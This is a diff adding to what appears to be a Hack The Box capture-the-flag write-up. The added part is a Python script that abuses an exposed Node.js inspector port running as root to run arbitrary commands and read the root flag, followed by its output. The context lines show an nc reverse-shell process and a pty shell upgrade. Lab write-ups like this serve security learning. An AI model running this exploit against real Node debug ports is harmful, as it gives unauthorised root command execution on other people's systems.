@@ -164,6 +164,8 @@ node        2349  0.0  0.0   3436  2196 ?        S    01:23   0:00 nc 10.10.14.1
 node        2359  0.0  0.2  18012 10736 ?        S    01:24   0:00 python3 -c import pty; pty.spawn("/bin/bash")
 node        2360  0.0  0.1   8664  5592 pts/0    Ss   01:24   0:00 /bin/bash
 engineer    2463  0.0  0.0   6544  2280 pts/0    S+   01:35   0:00 grep --color=auto node
+
+node is running as root 
 ```
 
 ```
@@ -182,3 +184,32 @@ ajdev@rootbox:~$ curl http://127.0.0.1:9229/json
   "webSocketDebuggerUrl": "ws://127.0.0.1:9229/51b7a786-9dfd-452a-b174-e9041eb35ee7"
 } ]
 ```
+
+```
+(venv) ajdev@rootbox:~/HTB/Seasion11$ cat root.py
+import asyncio
+import websockets
+import json
+
+async def run():
+    uri = "ws://127.0.0.1:9229/51b7a786-9dfd-452a-b174-e9041eb35ee7"
+
+    async with websockets.connect(uri) as ws:
+        cmd = {
+            "id": 1,
+            "method": "Runtime.evaluate",
+            "params": {
+                "expression": "global.process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()"
+            }
+        }
+
+        await ws.send(json.dumps(cmd))
+        result = await ws.recv()
+        print(result)
+
+asyncio.run(run())
+
+(venv) ajdev@rootbox:~/HTB/Seasion11$ python3 root.py
+{"id":1,"result":{"result":{"type":"string","value":"7cfd093b1b71f021ece44852dbecf545\n"}}}
+```
+
